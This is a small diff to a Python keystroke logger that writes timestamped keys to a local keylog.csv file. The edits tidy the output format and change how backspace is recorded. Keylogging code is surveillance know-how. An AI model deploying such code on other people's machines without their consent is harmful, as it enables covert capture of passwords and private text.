@@ -10,7 +10,7 @@ def on_press(key):
         print(key.char)
 
         f = open("keylog.csv", "a")
-        f.write(f"{dt}  |  {key.char} \n")
+        f.write(f"{dt}  |  {key.char}\n")
 
 
 
@@ -24,7 +24,7 @@ def on_press(key):
         if k == "Key.shift":
             k = "{shift}"
         if k == "Key.backspace":
-            k = "{backspace}"
+            k = ""
         if k == "Key.enter":
             k = "{enter}"
         if k == "Key.tab":
